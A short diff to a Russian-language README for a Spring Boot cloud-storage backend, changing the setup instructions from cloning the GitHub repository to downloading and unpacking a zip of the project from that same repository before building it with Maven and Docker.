@@ -58,7 +58,7 @@ _FRONT_ приложение использует header `auth-token` в кот�
 
 #### Запуск _BACKEND:_
 
-- Клонируем проект на свой _ПК_ [CloudStorage](https://github.com/Klementino75/CloudStorage.git).
+- Скопировать и распаковать zip-файл с проектом на свой _ПК_ [CloudStorage.zip](https://github.com/Klementino75/CloudStorage/blob/main/CloudStorage.zip).
 - Запускаем приложение [Docker Desktop](https://www.docker.com/products/docker-desktop/).
 - Запускаем терминал в папке `/CloudStorage` и собираем _jar-архив_ с нашим _Spring Boot_ приложением:
    1. ```mvn clean package -Dskiptests```
